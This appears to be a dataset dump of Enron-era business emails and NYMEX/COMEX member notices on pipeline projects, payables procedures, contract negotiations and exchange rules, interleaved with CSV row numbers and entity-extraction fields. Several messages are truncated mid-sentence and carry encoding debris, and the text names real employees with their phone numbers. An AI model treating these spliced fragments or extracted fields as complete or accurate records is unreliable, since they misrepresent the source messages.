The proposed storage project near Evanston, WY, will provide firm storage service with interconnects to Questar Pipeline, Williams Pipeline-West (Kern River and Northwest Pipeline), Overthrust Pipeline and Overland Trails Pipeline. Ultimate maximum storage capability is expected to be 14 Bcf. Depending on market support, caverns will be developed on a sequential or concurrent basis. The open season for the storage project will close on June 1, 2001. To determine rates, Questar said it will evaluate the working gas quantity requested, the anticipated shipper utilization patterns and the facilities required to complete the project. It anticipates that the price of these services will be $4.00/Dth/year plus usage charges, ACA, fuel reimbursement or any other applicable charges. For a shipper cycling its storage 12 times per year, this equates to $0.333/Dth/cycle.

1191,"FERC Approves North Baja Pipe 
The Federal Energy Regulatory Commission Wednesday voted to approve the proposed North Baja Pipeline which will deliver 500 MMcf/d of natural gas from a connection with El Paso Natural Gas near Ehrenberg, AZ, to gas distribution systems and new power plants in northern Mexico and Southern California. 
The U.S. line, which is being built by PG&E Corp.'s National Energy Group, would extend 80 miles to border-crossing facilities near Yuma, AZ. It is expected to cost about $146 million. The Mexican government already has issued a transportation permit to Sempra Energy International to build the 135-mile Mexican portion, Gasoducto Baja norte, to Mexicali, Baja California. 
FERC's approval came after the FERC staff, and the staffs of the California State Lands Commission and the Interior Department's Bureau of Land Management issued a favorable final environmental impact statement. The Commission already had issued a preliminary determination, approving all non-environmental aspects of the project. 
If the project ""is constructed as modified and in accordance with [North Baja 's] proposed mitigation and our recommendations, it would be an environmentally acceptable action,"" the staffs of the three agencies concluded in the final environmental impact statement (FEIS) on the pipeline (CP01-22). 
The pipeline could be delivering gas to the first of two new power plants in Mexicali as early as mid-summer. Work has been underway for some time on the longer, Mexican portion of the line which runs from Yuma, AZ, near the Mexican border to the Rosarito Beach area south of Tijuana in the northwest corner of Baja.",,about $146 million,FERC The Federal Energy Regulatory Commission MMcf El Paso Natural Gas PG&E Corp.'s National Energy Group Sempra Energy International Gasoducto Baja norte the California State Lands Commission the Interior Department's Bureau of Land Management Commission FEIS

This Information Applies ONLY to Organizations Supported by Houston-based Accounts Payable Processing Centers 

Earlier this week I was pleased to announce that Enron's new procurement and payment tool, iBuyit eProcurement, is now live for those who previously requested IT hardware from IT Central.  But there is still more to come! On May 1st the iBuyit Payables system will be activated for all organizations supported by Houston-based Accounts Payable processing centers.  The new iBuyit Payables system will increase the efficiency of the accounts payable process by capturing invoices as scanned images at a central point of receipt and routing them electronically for coding, payment authorization, and issue resolution. 

In preparation for this transition, there are some simple changes to the way you currently order and pay for goods and services.  Following these changes will ensure that your invoice is correctly processed through the iBuyit Payables system. 

Effective immediately, provide vendors with the following information when placing an order and instruct them to reference this information:   
*  Company Number or Legal Entity Name
*  Contact Name 
*  Personal External Identification Number (EID) or Approved Purchase Order Number   
*  New P.O. Box  (See Below)

What is an EID? 
An EID is your External Identification Number (EID). This EID number identifies the purchaser and helps route non-purchase order invoices back to the purchaser electronically through iBuyit.  

Do I need to use an EID for non-purchase orders?
Yes.  When ordering goods and services with a non-purchase order, the purchaser should provide the vendor with the appropriate EID.  It is your responsibility to communicate to vendors that an EID is now required for non-purchase orders.

Do I need to use an EID for purchase orders?
No.  When ordering goods and services with an approved purchase order, you should provide the vendor with a purchase order number as you currently do.  


What if I do not know my EID?
All Enron employees are assigned an EID number. If you purchase goods and services on behalf of Enron, you need to know your personal EID number.  You can access your EID number in eHRonline.  Logon to eHRonline, choose ""Personal Information"" to pull up your personal profile.  On the left side of the ""Personal Information"" screen select ""Other"" and you will see your:
*  PID (SAP ID)
*  GIS ID
*  EID

What is our new mailing address (PO Box)?
Effective immediately, instruct the vendor to mail the invoices to the following address:
PO Box 4734  
Houston, TX  77210-4734

What do I do if an invoice comes directly to me?
HOUSTON LOCATIONS ONLY
If an invoice comes directly to you, mark the envelope ""Attention Enron Accounts Payable,"" and place the envelope in an AP drop box at any Enron mail center.

FIELD LOCATIONS ONLY
If Houston currently processes your invoices, and an invoice comes directly to you, they will continue to be processed by the Accounts Payable department in Houston.  Please send invoices to the new PO Box above or the following physical address:  
3724 Dacoma
Houston, TX  77092
ATTENTION ENRON ACCOUNTS PAYABLE

Note:  ETS Field locations will continue to process non-purchase order invoices locally.

How will vendors learn about these changes?
This information will be shared directly with vendors in a separate communication.

Attached is a file which outlines the conditions at which two phase flow will occur when 450,000 gpd of butane is injected.  Also included are details of the gas mixture.  Note that we are well under the 3% C3 limitation imposed by SoCal.  I will perform further analysis to determine how much more butane we can inject, thereby increasing our deliveries to SoCal.
 

It does not appear that two phase flow will occur.  There may be potential for hydrate formation once the gas is in California, however.

	I'm trying to rebuild my PC at home.  The hard drive cratered on me.  I've installed a new one, but the only windows operating system I have is on a restore disk from Compaq (win95) and for some reason, it's giving me an ""image builder"" error when I try the restore.  This may be due to the fact that I trying to restore on a bigger hard drive than the original.

Anyway, I also have win98 upgrade 2nd edition.  When I try to load this, is looks for verification of ownership of a previous win system (which I don't have except on the restore disk which won't work).

1212,"Shelley,
I'm glad we made the decision to participate in today's drafting session.  =
There were only nine of us involved, with Ed Ross, Skip Simmons and Craig C=
hancellor representing the generators, while Byron White, Georgia Carter an=
d myself were there to represent the pipelines.  The others were with the A=
lliance.  Ed was his usual self.  He was confidently making the good econom=
ic case why the pipelines should consider the generator's position and how/=
why the FERC would likely side with them.  Craig tried to frame it commerci=
ally, and Skip played peacemaker.  Byron and I played a little ""good cop/ba=
d cop"" on behalf of the pipes, with Byron being the bad cop. =20

Anyway, sum and substance, I think we'll be more pleased with the next draf=
t of this document than what was submitted to us recently.   The first sent=
ence was replaced with a more sweeping statement of intent and mission of t=
he parties that focused on the provisioning of the service being subject to=
 physical operating considerations.  There emerged a realization that maybe=
 two products are being contemplated here:  (1) a product that blocks out a=
 period of time for uniform deliveries (say, 8 hours), and (2) a product th=
at basically provides the generator an option on when to take the agreed up=
on block of capacity.  It was agreed that the first product is likely to be=
 less valuable than the second, and priced accordingly.  Byron and I argued=
 that segmenting hourly rights should not be mandated, and in fact, may be =
physically impossible along some locations of the pipeline.  The generators=
 originally intended segmenting as possibly relating to how the NURF rights=
 were carved up by hour, (ex. an 8 hr. block of 5,000/d could be repackaged=
 as two 8 hr. blocks of 2,500/d).  I'm not sure whether we got consensus th=
ere or not -- we'll have to see the next draft.

The big ticket items (nos. 8, 9) got the most press.  I was troubled by the=
 generators' interpretation of both.  In the case of no. 8, the generators =
wanted to predesignate a mechanism whereby an existing customer holding a f=
irm service (whether FT, NNS or storage) could, pursuant to the conversion =
formula, remarket their original firm service as NURF.  The generators were=
 looking at this provision as ""throwing a bone"" to existing customers who m=
ight want to compete with the pipeline for NURF service using capacity (ex.=
 seasonal) that may not be fully utilized.  Obviously, the predetermined co=
nversion factor was a huge problem for the pipelines, as well as the whole =
notion of trying to fit a round peg into a square hole (ie. two or more dif=
ferent product types).  We pointed out the services were all different, and=
 in fact, any combination of those services, conceivably, could be repackag=
ed under today's rules and sold as a proxy for NURF.  I believe we were suc=
cessful in taming that language down substantially.  However, be on the loo=
kout for the next draft.

Finally, with respect to no. 9, where the generators want receipts consider=
ed rateable with deliveries for purposes of NURF, the generators had an int=
ersting slant.  Essentially, Ed was saying that he didn't want the pipeline=
s to hold the generators hostage on rates for NURF if the pipelines were th=
e only ones who could offer NURF.  By requiring the pipelines to consider r=
ateable receipts as meeting the NURF criteria, then Ed said the generators =
would receive the benefits of a competitive marketplace for ""NURF-like"" ser=
vice.  Skip pointed out that taking gas out of storage at Westar in West Te=
xas and using it as an hour by hour offset for deliveries to a power plant =
located at the California border was probably unworkable.  However, he also=
 posed the hypothet that if SoCalGas were to provide the same storage servi=
ce at the California border and those deliveries into SoCalGas could be adj=
usted to take into account the deliveries to the power plant (a sort of div=
ersion of gas theory), then the pipeline should be operationally indifferen=
t to whether it was providing NURF service or a 3rd party was providing a N=
URF-like service.  They just want others to have the ability to compete wit=
h the pipeline.

Of course, the pipeline argued that operationally those products may not be=
 the same.  Moreover, accepting such a nomination from SoCalGas could conce=
ivably knock off other uses of the capacity the pipeline was counting on (I=
T, LFT, etc.) as an offset which gave rise to the lower rate for the pipeli=
ne's NURF service.  Skip scratched out a more tame version of no. 9, and Ed=
 agreed to consider it.  Be on the lookout for what they come up with.

Overall, as I said, I'm glad I was there, as well as the other pipeline rep=
resentatives.  I hope that we were successful in getting the generators bac=
k on track here.  I'll be interested in seeing how much of our discussion t=
oday is embodied in the next generator draft.

 At the request of Mitch Dutton, I have reviewed the form of 311 and 
intrastate gas transportation agreements provided to AEP by Duke Energy 
Guadalupe Pipeline, Inc. and by EPGT Texas Pipeline, L.P.   As we discussed 
this morning, these agreements appear to be the standard form of agreement 
utilized by these counterparties.  Although I have no authority to approve 
them for execution by AEP, had they been provided to me for execution by HPL, 
I would approve them for execution.  
 Please note the Balancing and Penalties provision of the agreements for the 
charges which these parties could impose should receipts and deliveries get 
out of balance.  If time permitted I would suggest that these charges be 
negotiated to something closer to the actual costs incurred by the 
transporter.   However, it has been my experience that these parties are 
reluctant to change the standard form for standard transportation services.

Ormet would like to finalize this transaction by the end of this week 
(Friday, Nov 17).  Could you please make every effort to get with Amy Baird 
to resolve those two legal issues from her Oct 13th memo (items 3&4).  
Regarding Item 2 we agreed to a $1mm cap for the entire contract term.    
Also, the contract does not address any of the pricing terms of the deal.  
I'm assuming that this would be covered in the confirmation rather than the 
base of the contract   Could you please send a draft of the confirmation to 
Mike Cesario by tomorrow morning.  
I've sent you a copy of my proposal so you know the terms.  There's a few 
additional items that need to be included.
Please DO NOT include the pricing (NYMEX + .055) .  That's still being 
negotiated.

1.  Enron will warrant that we will have 15,000 of FT on Koch
2. Ormet pays the demand charge ($.05) on the transport on any volumes below 
15,000/d
3.  Volumes above 15,000/d up to 22/d will be supplied on IT.  We will 
utilize the same receipt/delivery path as the FT volumes in order to get the 
discounted transport rate.  If Koch cuts our IT, we will use best efforts to 
get the gas there on another path or on Cypress.  We will pass thru the 
actual transport costs if they are above the discounted FT rate.
4.  Ormet must supply us with accurate and timely consumption information

5.   If Koch declares Force Majeure on our FT,  we must use best efforts to 
get gas and transport on Cypress before we declare FM

6. This is a full requirements contract (we supply all the gas that they 
consume)
7.  If Koch's tariff changes and they go away from monthly balancing, then we 
will have a price re-opener.
8.  If Ormet's loads change significantly (i.e. new cogen) we will have a 
price re-opener.

1244,"Dan, Bruce Kohrs of Keyspan left me a message this weekend with respect to 
the schedule 'A' that they would like attached.  Assuming that the central 
desk has agreed to the contents of schedule 'A' - and they have been involved 
in drafting this document - I don't see a lot of commercial risk, especially 
given the lack of 'damages' in the event of any defaults to schedule 'A'.  My 
understanding was that we would all work together on a reasonable efforts 
basis to allow gas to flow daily.  They contents of schedule 'A' and its true 
enforceability does not seem to really change the spirit of the agreement.
If they are really adamant about including the schedule 'A', and the central 
desk has reviewed and expressly agreed to its contents, then I would not 
object to including the schedule 'A' as part of the contract.

As you are aware, Enron is currently in the process of amending a number of 
guarantees with respect to various Engage Energy entities.  Under the 
project, the 
 US$25 million guarantee provided to Enron Corp. and its subsidiaries to 
guarantee the obligations of Engage Energy Canada L.P. and Engage Energy  US 
L.P. ,as provided by The Coastal Corp. (the ""Existing Guarantee""), is to be 
replaced with a number of guarantees which are segmented by the Engage Energy 
entities and the type of contract (i.e. physical v. financial).  

As part of this project, Russell Diamond has provided Enron Canada Corp. with 
revised credit terms for dealing with Engage Energy Canada, L.P. under which 
Westcoast Gas Inc. is to provide a US$20million guarantee of the obligations 
of Engage Energy Canada L.P. under the existing master physical gas 
purchase/sale agreement between the Engage Energy Canada L.P. and Enron 
Canada Corp. (the ""ECC Physical Master"") as well as the master physical gas 
purchase/sale agreement between Engage Energy Canada L.P. and Enron North 
America Corp. (the ""ENA Physical Master"").   Russell had allocated US$15 
million of the replacement guarantee to the ECC Physical Master and 
US$5million to the ENA Physical Master.

Due to other inadequacies in the ECC Physical Master, we have prepared an 
""Amended and Restated"" ECC Physical Master which includes a number of 
significant terms in addition to referring to the replacement guarantee 
(which we are quite eager to have Engage execute).  As a result, I have 
prepared a draft of  replacement guarantee (to be received from Westcoast Gas 
Inc.) to accompany the Amended and Restated ECC Physical Master.  However, to 
ensure that the replacement guarantee meets your requirements, I am looking 
for your input.  Please find attached a copy of the draft replacement 
guarantee as blacklined to indicate the changes which have been made to the 
Enron Canada Corp. standard guarantee to incorporate the obligations owing to 
Enron North America Corp.  As you will see, there are a few bullets for which 
I require your assistance in completing (i.e. date the of ENA Physical Master 
and the appropriate contact information for notices).

When you get the opportunity, could you please review the blacklined 
replacement guarantee?  Once again, we are quite eager to send out the 
Amended and Restated ECC Physical Master.

",Datamanager Rob Cass,,Enron
1359,"Bob:

Our issues with hedge funds are somewhat complicated.  The threshold issue is 
that they are severely limited by their fundamental documents (the prospectus 
will spell out what they can invest in) so we have to review those documents 
before trading.  That is more than we do for run-of-the-mill domestic 
corporates and takes a lot  of legal resources that so far have been spent 
elsewhere.

The other issue is more difficult because it is hard to peg down and relates 
to regulatory uncertainty.  About a year ago a major hedge fund (Long Term 
Capital) got into serious trouble and the regulators stepped in, 
orchestrating a bail-out.  There was much wringing of hands and gnashing of 
teeth in Washington afterwards and since then there have been a variety of 
messages coming out of Washington relating to derivatives trading with hedge 
funds - none of them good.  Our view is that the regulators will be paying 
much closer attention to hedge fund trading of derivatives than in the past 
and we don't want that spotlight shining on us.  [In case you're interested: 
notwithstanding their name, hedge funds are speculators.  Much of the federal 
regulation of derivatives has assumed that hedging -- as opposed to 
speculation -- was safer and therefore more palatable.  The failure of a 
large hedge fund might result in damaging ripple effects throughout the 
financial markets.  Hence the regulators' heightened scrutiny.]

For both of these reasons, when EnronOnline was launched it was with the 
internally stated policy that we would not give access to hedge funds (or 
individuals - for similar reasons).  

Commodity Trading Advisors can not trade on EnronOnline on behalf of their 
customers just as Brokers cannot.

1387,"This link should get you access to our Financial Trading, or ""Master Swap 
Agreement"" database.  This database lists all the master swap agreements we 
have in place or have drafted in the US, London, Singapore, Japan, South 
America, etc..  It is a very good resource to use when preparing 
confirmations.  This database is available to all Enron employees, so feel 
free to send this link to any London employees you think might find it 
helpful.  There are certain comments concerning the status of masters under 
negotiation that are only available to Legal and Credit employees because of 
legal-client confidentiality concerns.  Any member of your legal team should 
be able to look at those comments to determine if there is active/close 
negotiation on a master, or if a master is being amended, what the amendments 
might address (sometimes helpful when Houston isn't at work yet!).  
Frequently there may be more than one master in place for an Enron company, 
so look at each entry to determine whether the master is limited to a 
specific finance project or product (unusual, but sometimes).  Also, as I 
mentioned, not all the US based masters are ISDA Multi-Currency Masters, so 
look to confirm what type of master we entered into.  If they are not ISDA 
Multi-Currency Masters, it may not be possible to put a cross-border trade 
under the master without some modification to the master or confirmation.

Please note:  there is a listing for ""Restrictions"" which will reflect any 
trading limitations such as ""crude oil trades only"", ""no trades over 2 
years"", contain special confirmation issues or list other types of trading 
limitations.  Restrictions should ALWAYS be looked at because they contain 
critical trading guidance.  Another note to watch out for is that many US 
based master may have Texas law instead of NY.  Certainly not UK law.  We 
hope to have that information available in the database in the future.

If for some reason you can't access this database, let me know and we'll get 
our respective computer people to figure out why.

As I mentioned, I am a paralegal in the Houston swap group and am happy to 
answer any questions about particular masters, so please do not hesitate to 
call me at x33399.

SUBJECT:	Approved Amendments to COMEX Rule 4.94, ""Settlement Price
Procedures for Copper Contracts""


The Exchange has complied with regulatory requirements by filing with the
Commodity Futures Trading Commission amendments to COMEX Rule 4.94,
""Settlement Price Procedures for Copper Contracts"".  The approved amendments
to Rule 4.94 modify the settlement price procedure for the current delivery
month by taking into consideration, not only the weighted average price
(rounded to the nearest minimum fluctuation) of all outright transaction
that occur in the closing range, but also the weighted average for all
spreads executed and all spread bids and offers actively represented between
the most active month and the current delivery month during the final thirty
minutes of trading.

A copy of the amended Rule 4.94 is attached.  These Rule amendments will
become effective on Monday, October 29, 2001.

Should you have any questions please contact Michael Campanelli at
212-299-2072, Albert J. Getz at 212-299-2608 or Ploumi Efkarpidis at
212-299-2334.

Approved Rule Amendments
(Asterisk indicates additions: bracketing indicates deletions)

Rule 4.94	Settlement Price Procedures for Copper Contracts.

	(A)(i) The term ""base month"" shall mean the March, May, July,
September, and December delivery months; (ii) the term ""most active month""
with respect to this rule and the rules of COMEX Chapters 11 and 17 shall
mean the base month that is not the current delivery month, with the
greatest reported open interest on the official COMEX daily open interest
report.

* (B)   The settlement price for the current delivery month shall be
comprised of the weighted average price (rounded to the nearest minimum
fluctuation) of all outright transactions that occur in the closing range
combined with the weighted average price of all spreads executed between the
current delivery month and the most active month and all spread bids and
offers between the current delivery month and the most active month actively
represented during the final 30 minutes of trading.  If no outright
transactions occur in the closing range or no spreads are executed or there
are no spread bids and offers actively represented during the final 30
minutes of trading in the current delivery month, the settlement price shall
be the last trade price, unless during the closing range a bid higher or
offer lower than the last trade price is made.  In such event, such higher
bid or lower offer shall be the settlement price. *

	[(B)] *(C) *  The settlement price for the [current delivery month
and the] most active month shall be the weighted average price (rounded to
the nearest minimum fluctuation) of all outright transactions that occur in
the closing range.  If no outright transactions occur in the closing range
of [either the current delivery month and] the most active month, the
settlement price [for the applicable month] shall be the last trade price,
unless during the closing range a bid higher or offer lower than the last
trade price is made.  In such event, such higher bid or lower offer shall be
the settlement price.

	[(C)] *(D)*  In all other delivery months, the settlement prices
shall be determined based upon spread relationships between and among
contract months, which relationships shall be determined in the judgment of
the Settlement Price Committee with:  (a) greater weight given to spreads
executed late in the trading day in large volumes, and (b) lesser weight
given to (i) spreads traded in lesser volumes, (ii) spread bids and offers
actively represented late in the trading day, and (iii) spread transactions,
bids and offers from earlier in the trading day.  Notwithstanding the
foregoing, no settlement price shall be established that would be lower than
the best outright bid, or higher than the best outright offer, that:  (a)
was for at least 20 contracts, and (b) had been posted with the Exchange and
had remained available for execution and unfilled for the final 30 minutes
of trading of that trading day.

	[(D)] *(E)*  If any settlement price, determined pursuant to
Paragraph [(C)] *(D)*, is inconsistent with transactions that occurred
during the closing range for other delivery months of the same futures
contract or with other market information known to the Committee, the
Committee may establish a settlement price at a level consistent with such
other transactions or market information.  In such event, the Committee
shall prepare a written record of the basis for any settlement price so
established.",J. Robert Collins Jr. Michael Campanelli Albert J. Getz Ploumi Efkarpidis,,"COMEX Exchange COMEX Chapters 11 the Settlement Price Committee Committee the

Patrick and I met with Jason Williams and Veronica Espinoza today to talk, in part, about the flow of information from credit to legal to confirms regarding Credit Attachments.  One area that I wanted to clarify with you folks is regarding the ""title"" of the Annexes.  Sometimes we receive an Annex B/B-1 where, underneath the CP name, there is reference to a specific deal number.   We attach it to the confirm, send it on its way, and we assume then that this Annex is deal specific.

This causes confusion in our groups, because when subsequent deals are transacted with the same counterparty, credit advises us to use the previously provided Annex.  However, when we go to attach what we believe to be the relevant Annex, we stop because it references another deal number.  Jay and Veronica informed us that the Annexes should not be deal specific, just counterparty specific. 

So.....unless there is some other reason of which we are not aware, would you guys be able to discontinue putting specific deal numbers on the Credit attachments you create?  

Let me know if I'm missing part of a bigger picture or if you have questions.

Re:
NYMEX ACCESS
 Order Entry


	NYMEX Rule 6.22, ""Acceptance of Orders for Entry into NYMEX
ACCESS
,"" specifies the requirements for placement of orders into the
ACCESS
  system for all commodities (NYMEX and COMEX Divisions).  A copy of
the Rule is attached.  Section (C) of this Rule, ""Acceptance of Orders From
Customers,"" specifically outlines the data necessary for input/placement of
orders, while Section (D), ""Order Recordation,"" sets forth the procedures
for handling customer orders.

	All electronic traders are required to enter the correct account
number and clearing member number for all transactions with the exception of
multiple accounts.  NYMEX Rule 6.22(E), ""Special Requirements,"" governs the
use of the ""999"" designation as it relates exclusively to multiple accounts.
Compliance Staff has additionally allowed for use of the ""999"" or common
holding account to be used on an ""intra-session"" basis for any account which
had not been set up prior to or during the ACCESS
 session in progress.  Use
of the ""999"" or common holding account may only be engaged on a one-time
basis for any account.  Thus, if ""999"" is designated three times in one
session related to three separate accounts for first time use of ACCESS
,
the ""999"" may never be subsequently designated for purposes of placing
orders for any of the three accounts.  Any misuse of the ""999"" or common
holding account would constitute a violation of Rule 6.22(C).

	The ACCESS
 System has enhanced functionality regarding the input
and storage of frequently used account numbers.  Electronic trading or
clearing member firms should contact the NYMEX Customer Service Center (the
""NCSC"") with any questions at (800) 438-8616.

	Any questions regarding the rule requirements cited above should be
directed to Thomas LaSala, Vice President, Compliance, at (212) 299-2897, or
David Schneiderman, Director, Trade Practice Surveillance, at (212)
299-2857.

Rule 6.22. ACCEPTANCE OF ORDERS FOR ENTRY INTO NYMEX ACCESS


 (A) DEFINITIONS-for purposes of these Rules, the following words shall have
the following definitions:

(1) ""Matching System""-The NYMEX ACCESS
 programs and database that accept,
match and report executions of orders in NYMEX ACCESS
.

(2) ""Strategy Pad""-The NYMEX ACCESS
 programs and database that may be used
by Electronic Traders and NYMEX ACCESS
 Operators to store orders, trading
strategies and other information, but that do not accept, match or report
execution of orders into the Matching System.

(B) No Clearing Member shall assign an account number that would accept the
entry of orders into NYMEX ACCESS
 for, or on behalf of, a customer, unless
such customer is first provided with an Electronic Trading and Order Routing
Systems Disclosure Statement in a form approved by the Exchange.

(C) ACCEPTANCE OF ORDERS FROM CUSTOMERS-No person or entity may accept an
order for execution on NYMEX ACCESS
 unless the following information is
received:

(1)   Commodity;

(2) Contract Month;

(3) Purchase or Sale;

(4) Customer Account Number (or certification that the order is for multiple
accounts to be later allocated);

(5) Quantity;

(6) Limit Price (except for stop, market discretion, MIT or market orders);

(7) Clearing Member (or certification that the order is for multiple
accounts to be later allocated);

(8) Strike prices, put or call (for options); and

(9) Any precondition for entry into the Matching System (i.e., stop, market
discretion, MIT, stop limit).

(D) ORDER RECORDATION-Immediately upon receipt, all customer orders for
execution on NYMEX ACCESS
 must be (1) entered into the Matching System or
Strategy Pad or, if such orders cannot be entered into the Matching System
or Strategy Pad within one minute of receipt, they must be (2) recorded
within one minute of receipt in non-erasable ink and time-stamped in
accordance with Rule 6.18, and entered into the Matching System or Strategy
Pad as soon as practicable.


(E) SPECIAL REQUIREMENTS

(1)   For any order known to be an order for multiple accounts to be
allocated after execution, the Electronic Trader's Account Number followed
by the suffix ""999"" shall be entered in satisfaction of subsection (B)(4) of
this Rule.  Only a person with trading discretion over multiple accounts may
place an order with a Member Firm, Electronic Trader or NYMEX ACCESS

Operator to be allocated after execution. No Member Firm, Electronic Trader
or NYMEX ACCESS
 Operator may accept an order for allocation after execution
unless the Member Firm, Electronic Trader or NYMEX ACCESS
 Operator or their
employer has on file a prior, written procedure for the systematic and
non-preferential allocation of executions among accounts. The customer's
actual Clearing Member and Customer Account Number must be provided no later
than 8:30 a.m. following the NYMEX ACCESS
 trading session in which the
transaction was executed.

(2) No person may knowingly record false account number information in
connection with any NYMEX ACCESS
 order.

(3) Unless otherwise agreed, all orders received for execution on NYMEX
ACCESS
 shall be deemed to be cancelled if not executed during the trading
session for which they were received.",J. Robert Collins Thomas LaSala David Schneiderman Limit Price,,"NYMEX NYMEX Division COMEX Divisions ACCESS the NYMEX Customer Service Center NYMEX ACCESS Exchange MIT Strategy Pad the Electronic Trader's NYMEX ACCESS

structure, although things have not yet been completely finalized, in order 
to be in a position to execute documents by Thursday, I think we need to 
continue or, where necessary start, the preparation of documents.  Based on 
Soma's structuring e-mail, $150 million will be coming from Royal Bank of 
Canada (RBC) and $150 million from The Toronto-Dominion Bank (TD), with Chase 
Manhattan Bank (Chase) acting as the sleeve on both transactions.  Regarding 
RBC's transaction, RBC will step into the shoes of Bow Valley Trust in the 
previous documents, so that RBC will be the counterparty under Swap 1.  RBC 
will remain as the counterparty under the interest rate swap and Chase will 
step into the spot where RBC was in the previous structure (with ENA put into 
the mix to do the swap with Chase).  The TD Bank transaction will be 
identical.  Therefore, I believe the relevant documentation is as follows:

We have agreed with RBC (subject to Bill Bradford's confirmation) to include 
a Material Adverse Change clause in all ISDA's creating a MAC and right to 
call for collateral if either party's credit rating moves below BBB-.

I think it is prudent to continue the effort to revise where appropriate or 
commence preparing the appropriate documents listed above, with a view to 
executing the documents by no later than mid-day Thursday.

Also, please be advised that I have spoken with Morris Clark on the tax 
issues and he will be reviewing the structure as proposed by Soma this 
morning to confirm there are no tax issues.  However, he has verbally 
confirmed to me that, since these are all swap transactions, there are no 
withholding tax issues.

MEMORANDUM

TO: ALL NYMEX AND COMEX MEMBERS

FROM: Neal L. Wolkoff, Executive Vice President

DATE: October 6, 2000

RE:
Notice of CFTC Approval of Executive Committee Resolution Amending Price=20
Fluctuation Limits for Trading on NYMEX ACCESSc
____________________________________________________________________

Please be advised that the CFTC has approved a Resolution of the Executive=
=20
Committee of the Board of Directors.  The Resolution amends on a temporary=
=20
basis a number of Exchange price fluctuation limit rules for trading on NYM=
EX=20
ACCESSc so as to ensure the successful implementation of the new implied=20
order functionality on NYMEX ACCESSc. (The price fluctuation limit rules th=
at=20
are now in effect for the Exchange=01,s contracts will remain the same for=
=20
trading occurring during Regular Trading Hours (""RTH"") on the trading=20
floor.)  The Resolution is attached and will become effective with the=20
commencement of the NYMEX ACCESSc session on Sunday, October 8, 2000.

By significantly expanding the price fluctuation limits applicable to tradi=
ng=20
activity occurring on NYMEX ACCESSc, the Resolution reduces the possibility=
=20
that a price limit would be triggered by the implied functionality.  The=20
Resolution amends the Exchange=01,s price fluctuation limit rules with rega=
rd to=20
trading on NYMEX ACCESSc in three ways:

(1) The initial and subsequent price fluctuation limits (for each Exchange=
=20
futures contract that has such limits) would be expanded to 200% of the=20
initial and subsequent price fluctuation limits applicable to the first two=
=20
contract months for energy contracts, or to the first contract month with=
=20
limits in effect for metals contracts, of that futures contract under the=
=20
applicable rule.

(2) This expanded limit (e.g., 200% of the limits for the front two months=
=20
for energy contracts) would be applicable to all contract months for that=
=20
futures contract.

(3) In the event that an expanded price limit was touched by a bid or offer=
,=20
trading on NYMEX ACCESSc generally would be halted immediately, rather than=
=20
requiring the market to trade at that price for five minutes. During the la=
st=20
90 minutes of a NYMEX ACCESSc session, the market would be halted only far =
as=20
long as it takes for the system to incorporate expanded price limits.

Finally, notwithstanding the changes noted above, in the event that a=20
contract trading on NYMEX ACCESSc traded for five minutes at a price=20
fluctuation limit applicable to RTH trading, then the RTH session would ope=
n=20
with expanded price fluctuation limits as provided under the applicable rul=
e,=20
even though there had been no temporary cessation of trading during the NYM=
EX=20
ACCESSc trading session.

If you have any questions, please contact Stu Homler, Director, NYMEX ACCES=
Sc=20
Operations, NYMEX ACCESSc Department, at (212) 299-2754, Matt Morano, NYMEX=

General Counsel, at (212) 299-2207.

APPROVED RESOLUTION OF THE EXECUTIVE COMMITTEE
OF THE BOARD OF DIRECTORS REGARDING PRICE
FLUCTUATION LIMITS FOR EXCHANGE CONTRACTS

The Executive Committee of the Board of Directors hereby

Resolves that, until further notice, the price fluctuation limit rules for=
=20
each futures contract that is listed for trading on NYMEX ACCESSc and that=
=20
has such applicable rules shall continue in effect except as amended below=
=20
with regard to market activity occurring on NYMEX ACCESSc:

The initial and subsequent price fluctuation limits (for each Exchange=20
futures contract that has such limits) shall be expanded to 200% of the=20
initial and subsequent price fluctuation limits applicable to the first two=
=20
contract months of that futures contract that have price limits under the=
=20
applicable rule.

This expanded limit (200% of the limits for the first two months with limit=
s)=20
shall be applicable to all contract months for that futures contract.

In the event that such a price fluctuation limit is reached by a bona fide=
=20
bid at the high price fluctuation limit or a bona fide offer at the low pri=
ce=20
fluctuation limit, trading on NYMEX ACCESSc shall be halted immediately=20
except as directed otherwise by the President or the President=01,s designe=
e. =20
Following resumption of trading, the price limits in effect shall be 200% o=
f=20
the limits applicable to RTH trading.  In the event that a limit is touched=
=20
during the last 90 minutes of a NYMEX ACCESSc session, the market shall be=
=20
halted briefly, and price limits shall be expanded thereafter

In addition, in the event that a contract trading on NYMEX ACCESSc traded f=
or=20
five minutes during the NYMEX ACCESSc session at a price fluctuation limit=
=20
applicable to the Regular Trading Hours session, then the RTH session shall=

rule, even though no temporary cessation of trading occurred during the NYM=

Could someone please prepare an assignment letter to move trade q13022.4 from 
NG Trading, LLC to NG Energy Trading, LLC.

Also, in the original confirmation certain credit language was added to 
require an independent amount of $1MM be held through maturity of the trade.  
NG Energy Trading, LLC recently received a guaranty from Alliant Energy 
Corporation, an A-rated utility, which will be used to secure the trade after 
the assigment.  Therefore, my question to you, is do we drop the independent 
amount language from the original confirmation and provide alternative 
language referencing the new specific guaranty.  If so, the date of the 
guaranty provided is October 24, 2000 and it is due to expire November 1,

RE:  Spot Month Procedures on the Eve of First Notice Day


Please be reminded that Tuesday, October 31, 2000, is the First Notice Day, 
for the Gold, Silver, Copper and Aluminum futures delivery month of November 
2000 (the new spot month).

On Monday, October 30, 2000, the Eve of the First Notice Day, all Brokers and 
Clearing Members must have a duly authorized, On-Line Trade Entry (""OLTE"") 
system trained representative available until such time as the Exchange deems 
necessary.

It is imperative that trades involving the Spot Month are processed and 
cleared properly.  Therefore, representatives are expected to make a diligent 
effort to process all Spot Month trades accurately.

Failure by any Clearing member or qualified Floor Trader to show due 
diligence involving Spot Month Trade processing may result in severe 
disciplinary action by the Exchange.

If you should have any questions, please do not hesitate to contact David 
Sherman at (212) 299-2061.

TO:  NYMEX Division Members

FROM:  The Board of Directors

RE:  Termination of Members Retention and Retirement Plan


As you have been previously advised, on Wednesday, October 4, 2000 the
Board of Directors voted unanimously to terminate the New York
Mercantile Exchange Members Retention and Retirement Plan (the Plan)
conditioned upon the Exchange receiving a satisfactory Private Letter
Ruling from the IRS in connection with the Exchange's pending
demutualization plan.  On October 17, 2000, the Exchange held an open
members meeting to discuss the termination of the Plan and to answer
any questions.  At the meeting, a number of members requested that the
Board review its decision to use the 8.5% discount rate recommended by
Deloitte & Touche in connection with termination of the Plan.  At the
members meeting, it was agreed that the Board would review the
discount rate issue again at its next regular meeting.

Following the members meeting, the Exchange obtained two additional
professional opinions from actuaries.  One opinion stated that the
